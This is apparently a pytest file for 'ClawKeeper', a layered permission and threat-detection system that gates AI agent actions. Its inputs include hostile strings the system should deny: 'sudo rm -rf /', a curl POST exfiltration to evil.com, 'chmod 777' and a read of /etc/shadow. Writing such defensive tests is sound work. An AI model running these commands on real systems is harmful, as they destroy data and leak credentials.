"""Tests for the ClawKeeper 3-layer capability-gated permission system."""

from __future__ import annotations

from typing import Any

from src.safety.claw_keeper import (
    Capability,
    ClawKeeper,
    EnforcementAction,
    PluginRuntimeEnforcer,
    SkillPolicy,
    SkillPolicyEngine,
    ThreatLevel,
    ThreatRecord,
    WatchState,
    WatcherMiddleware,
)


# ---------------------------------------------------------------------------
# Layer 1: Skill Policy Engine
# ---------------------------------------------------------------------------


def test_skill_policy_allow() -> None:
    engine = SkillPolicyEngine()
    policy = SkillPolicy(
        skill_id="search_tool",
        allowed_capabilities={Capability.FILE_READ, Capability.NETWORK_HTTP},
    )
    engine.register_policy(policy)

    action, reason = engine.evaluate("search_tool", Capability.FILE_READ, "/tmp/data")
    assert action == EnforcementAction.ALLOW
    assert "permitted" in reason.lower()


def test_skill_policy_deny_missing_capability() -> None:
    engine = SkillPolicyEngine()
    policy = SkillPolicy(
        skill_id="safe_skill",
        allowed_capabilities={Capability.FILE_READ},
    )
    engine.register_policy(policy)

    action, reason = engine.evaluate("safe_skill", Capability.PROCESS_EXEC)
    assert action == EnforcementAction.DENY
    assert "not in allowed set" in reason.lower()


def test_skill_policy_scope_constraint_violation() -> None:
    engine = SkillPolicyEngine()
    policy = SkillPolicy(
        skill_id="restricted_reader",
        allowed_capabilities={Capability.FILE_READ},
        scope_constraints={Capability.FILE_READ: ["/safe/path"]},
    )
    engine.register_policy(policy)

    action, reason = engine.evaluate("restricted_reader", Capability.FILE_READ, "/etc/shadow")
    assert action == EnforcementAction.DENY
    assert "not permitted" in reason.lower()


def test_skill_policy_explicit_deny() -> None:
    engine = SkillPolicyEngine()
    policy = SkillPolicy(
        skill_id="partial_trust",
        allowed_capabilities={Capability.FILE_READ, Capability.FILE_WRITE},
        denied_capabilities={Capability.FILE_DELETE},
    )
    engine.register_policy(policy)

    action, reason = engine.evaluate("partial_trust", Capability.FILE_DELETE)
    assert action == EnforcementAction.DENY
    assert "explicitly denied" in reason.lower()


def test_skill_policy_require_approval() -> None:
    engine = SkillPolicyEngine()
    policy = SkillPolicy(
        skill_id="dangerous_tool",
        allowed_capabilities={Capability.PROCESS_EXEC},
        require_approval_for={Capability.PROCESS_EXEC},
    )
    engine.register_policy(policy)

    action, reason = engine.evaluate("dangerous_tool", Capability.PROCESS_EXEC)
    assert action == EnforcementAction.ALERT
    assert "requires approval" in reason.lower()


def test_skill_policy_default_denies_all() -> None:
    engine = SkillPolicyEngine()  # No default policy registers

    action, reason = engine.evaluate("unknown_skill", Capability.FILE_READ)
    assert action == EnforcementAction.DENY


# ---------------------------------------------------------------------------
# Layer 2: Plugin Runtime Enforcer
# ---------------------------------------------------------------------------


def test_plugin_enforcer_privilege_escalation_critical() -> None:
    enforcer = PluginRuntimeEnforcer(threat_threshold=1)
    record = enforcer.evaluate(
        agent_id="agent1",
        action="sudo rm -rf /",
    )
    assert record[0] in (EnforcementAction.DENY, EnforcementAction.TERMINATE)
    assert "Critical threat" in record[1] or "sudo" in record[1].lower()


def test_plugin_enforcer_data_exfiltration_high() -> None:
    enforcer = PluginRuntimeEnforcer(threat_threshold=1)
    action, reason = enforcer.evaluate(
        agent_id="agent1",
        action="curl -X POST https://evil.com/collect",
    )
    assert action in (EnforcementAction.DENY, EnforcementAction.SANDBOX)
    assert "exfil" in reason.lower()


def test_plugin_enforcer_rapid_tool_chain_medium() -> None:
    enforcer = PluginRuntimeEnforcer(threat_threshold=1)
    action, reason = enforcer.evaluate(
        agent_id="agent1",
        action="call_tool_loop",
        context={"call_rate_per_minute": 150},
    )
    assert action == EnforcementAction.SANDBOX
    assert "Rapid tool-call chain" in reason


def test_plugin_enforcer_clean_action_allows() -> None:
    enforcer = PluginRuntimeEnforcer()
    action, reason = enforcer.evaluate(
        agent_id="agent1",
        action="read_file",
        context={"path": "/tmp/safe.txt"},
    )
    assert action == EnforcementAction.ALLOW


def test_plugin_enforcer_violation_counter() -> None:
    enforcer = PluginRuntimeEnforcer(auto_terminate_after=3)

    # Trigger 3 violations
    for _ in range(3):
        enforcer.evaluate("agent1", "chmod 777 /tmp/test")

    risk = enforcer.get_agent_risk("agent1")
    assert risk["total_violations"] >= 3


# ---------------------------------------------------------------------------
# Layer 3: Watcher Middleware
# ---------------------------------------------------------------------------


def test_watcher_context_size_fails() -> None:
    watcher = WatcherMiddleware(max_context_tokens=10_000)
    state = WatchState(
        agent_id="a1",
        context_size_tokens=50_000,
        active_tools=set(),
        resource_usage={},
        session_duration=100,
        recent_actions=[],
    )
    action, reason = watcher.evaluate(state)
    assert action == EnforcementAction.TERMINATE
    assert "Context size" in reason


def test_watcher_session_duration_fails() -> None:
    watcher = WatcherMiddleware(max_session_duration=60.0)
    state = WatchState(
        agent_id="a1",
        context_size_tokens=1000,
        active_tools=set(),
        resource_usage={},
        session_duration=5000,
        recent_actions=[],
    )
    action, reason = watcher.evaluate(state)
    assert action == EnforcementAction.TERMINATE
    assert "Session duration" in reason


def test_watcher_resource_limits_fail() -> None:
    watcher = WatcherMiddleware(max_memory_mb=1024.0, max_cpu_pct=80.0)
    state = WatchState(
        agent_id="a1",
        context_size_tokens=1000,
        active_tools=set(),
        resource_usage={"memory_mb": 2000.0, "cpu_pct": 90.0},
        session_duration=100,
        recent_actions=[],
    )
    action, reason = watcher.evaluate(state)
    assert action == EnforcementAction.TERMINATE
    assert ("Memory usage" in reason) or ("CPU usage" in reason)


def test_watcher_runaway_tool_chain_fails() -> None:
    watcher = WatcherMiddleware()
    state = WatchState(
        agent_id="a1",
        context_size_tokens=1000,
        active_tools={"tool_x"},
        resource_usage={},
        session_duration=100,
        recent_actions=["call_tool", "call_tool", "call_tool", "call_tool", "call_tool"],
    )
    action, reason = watcher.evaluate(state)
    assert action == EnforcementAction.TERMINATE
    assert "runaway" in reason.lower()


def test_watcher_clean_passes() -> None:
    watcher = WatcherMiddleware()
    state = WatchState(
        agent_id="a1",
        context_size_tokens=4000,
        active_tools=set(),
        resource_usage={"memory_mb": 512.0, "cpu_pct": 10.0},
        session_duration=30,
        recent_actions=["action1", "action2"],
    )
    action, reason = watcher.evaluate(state)
    assert action == EnforcementAction.ALLOW


# ---------------------------------------------------------------------------
# ClawKeeper Integration
# ---------------------------------------------------------------------------


def test_clawkeeper_skill_layer_blocks() -> None:
    keeper = ClawKeeper()

    policy = SkillPolicy(
        skill_id="blocked_skill",
        allowed_capabilities={Capability.FILE_READ},
    )
    keeper.register_skill_policy(policy)

    action, reason = keeper.evaluate(
        agent_id="agent1",
        skill_id="blocked_skill",
        capability=Capability.PROCESS_EXEC,
    )
    assert action == EnforcementAction.DENY
    assert "not in allowed set" in reason.lower()


def test_clawkeeper_plugin_layer_blocks() -> None:
    keeper = ClawKeeper()
    # No skill policy — allows through
    policy = SkillPolicy(
        skill_id="any_skill",
        allowed_capabilities={
            Capability.FILE_READ,
            Capability.NETWORK_HTTP,
            Capability.PROCESS_EXEC,
        },
    )
    keeper.register_skill_policy(policy)

    # Plugin layer will flag the sudo pattern
    action, reason = keeper.evaluate(
        agent_id="agent1",
        skill_id="any_skill",
        capability=Capability.PROCESS_EXEC,
        scope="sudo rm -rf /",
    )
    assert action in (EnforcementAction.DENY, EnforcementAction.TERMINATE)
    assert "sud" in reason.lower() or "Critical threat" in reason


def test_clawkeeper_watcher_layer_blocks() -> None:
    keeper = ClawKeeper(max_context_tokens=5000)

    policy = SkillPolicy(
        skill_id="tool",
        allowed_capabilities={Capability.FILE_READ},
    )
    keeper.register_skill_policy(policy)

    # Provide a watch_state that will fail
    watch_state = WatchState(
        agent_id="agent1",
        context_size_tokens=50_000,
        active_tools=set(),
        resource_usage={},
        session_duration=100,
        recent_actions=[],
    )

    action, reason = keeper.evaluate(
        agent_id="agent1",
        skill_id="tool",
        capability=Capability.FILE_READ,
        scope="/tmp/data",
        context={"watch_state": watch_state},
    )
    assert action == EnforcementAction.TERMINATE
    assert "Context size" in reason


def test_clawkeeper_clean_path_allows() -> None:
    keeper = ClawKeeper()

    policy = SkillPolicy(
        skill_id="reader",
        allowed_capabilities={Capability.FILE_READ},
        scope_constraints={Capability.FILE_READ: ["/safe/"]},
    )
    keeper.register_skill_policy(policy)

    watch_state = WatchState(
        agent_id="agent1",
        context_size_tokens=1000,
        active_tools=set(),
        resource_usage={},
        session_duration=10,
        recent_actions=[],
    )

    action, reason = keeper.evaluate(
        agent_id="agent1",
        skill_id="reader",
        capability=Capability.FILE_READ,
        scope="/safe/data.txt",
        context={"watch_state": watch_state},
    )
    assert action == EnforcementAction.ALLOW


def test_clawkeeper_audit_logging() -> None:
    keeper = ClawKeeper()

    policy = SkillPolicy(
        skill_id="test_skill",
        allowed_capabilities={Capability.FILE_READ},
    )
    keeper.register_skill_policy(policy)

    # Denied by skill policy
    keeper.evaluate(
        agent_id="agent1",
        skill_id="test_skill",
        capability=Capability.PROCESS_EXEC,
    )

    # Denied by plugin
    keeper.evaluate(
        agent_id="agent1",
        skill_id="test_skill",
        capability=Capability.FILE_READ,
        scope="some_action_with_sudo_pattern",
    )

    log = keeper.get_audit_log(agent_id="agent1")
    assert len(log) >= 2
    assert any(e.capability == Capability.PROCESS_EXEC for e in log)
    assert any(e.layer == "skill" for e in log)


def test_clawkeeper_risk_summary() -> None:
    keeper = ClawKeeper()

    policy = SkillPolicy(
        skill_id="skill_a",
        allowed_capabilities={Capability.FILE_READ},
    )
    keeper.register_skill_policy(policy)

    # Generate some plugin threats
    for _ in range(3):
        keeper.evaluate(
            agent_id="agent1",
            skill_id="skill_a",
            capability=Capability.FILE_READ,
            scope="chmod 777 /tmp",
        )

    summary = keeper.risk_summary(agent_id="agent1")
    assert summary["agent_risk"]["total_violations"] >= 3
    assert summary["registered_skills"] == 1
    assert summary["active_detectors"] > 0


# ---------------------------------------------------------------------------
# Customization & extensibility
# ---------------------------------------------------------------------------


def test_clawkeeper_custom_threat_detector() -> None:
    keeper = ClawKeeper()

    def custom_detector(ctx: dict[str, Any]) -> ThreatRecord | None:
        if "secret" in ctx.get("action", ""):
            return ThreatRecord(
                threat_level=ThreatLevel.HIGH,
                description="Custom: secret action detected",
                agent_id=ctx.get("agent_id", ""),
            )
        return None

    keeper.register_threat_detector("custom_secret", custom_detector)

    policy = SkillPolicy(
        skill_id="any",
        allowed_capabilities={Capability.FILE_READ},
    )
    keeper.register_skill_policy(policy)

    action, reason = keeper.evaluate(
        agent_id="agent1",
        skill_id="any",
        capability=Capability.FILE_READ,
        scope="perform_secret_operation",
    )
    assert action in (EnforcementAction.DENY, EnforcementAction.SANDBOX)
    assert "Custom" in reason or "secret" in reason.lower()


def test_clawkeeper_custom_watcher_check() -> None:
    keeper = ClawKeeper(max_context_tokens=10_000)

    def custom_check(state: WatchState) -> tuple[bool, str]:
        if "forbidden_tool" in state.active_tools:
            return (False, "Forbidden tool is active")
        return (True, "OK")

    keeper.register_watcher_check(custom_check)

    # Register permissive skill policy
    policy = SkillPolicy(
        skill_id="any",
        allowed_capabilities={
            Capability.FILE_READ,
            Capability.PROCESS_EXEC,
            Capability.NETWORK_HTTP,
        },
    )
    keeper.register_skill_policy(policy)

    watch_state = WatchState(
        agent_id="a1",
        context_size_tokens=1000,
        active_tools={"forbidden_tool"},
        resource_usage={},
        session_duration=10,
        recent_actions=[],
    )

    action, reason = keeper.evaluate(
        agent_id="a1",
        skill_id="any",
        capability=Capability.FILE_READ,
        context={"watch_state": watch_state},
    )
    assert action == EnforcementAction.TERMINATE
    assert "Forbidden tool" in reason
